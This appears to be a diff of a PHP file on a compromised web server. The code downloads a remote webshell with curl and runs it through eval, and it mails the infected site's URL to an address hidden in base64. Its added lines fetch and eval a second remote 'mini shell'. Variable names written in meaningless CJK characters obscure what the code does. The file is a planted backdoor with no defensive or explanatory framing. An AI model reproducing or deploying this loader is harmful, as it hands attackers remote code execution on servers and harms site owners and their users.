@@ -68,8 +68,7 @@ function geturlsinfo($f)
     return $urls;
 }
 
-$f =
-    "https://raw.githubusercontent.com/exploit-haxor/webshell/main/ob_gz.php";
+$f = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/ob_gz.php";
 $h = curl_init();
 curl_setopt($h, CURLOPT_URL, $f);
 curl_setopt($h, CURLOPT_RETURNTRANSFER, true);
@@ -79,6 +78,10 @@ echo eval("?>" . $output);
 $勩搞銐櫦埢剚技併墎晥 = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
 $裤亾仌瘑笺倐曘劗銈瞾 ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "combo";
 mail($勩搞銐櫦埢剚技併墎晥,"http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . ", $裤亾仌瘑笺倐曘劗銈瞾);
+$a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
+eval('?>' . $a);
+
+?>
 C	
 
 			
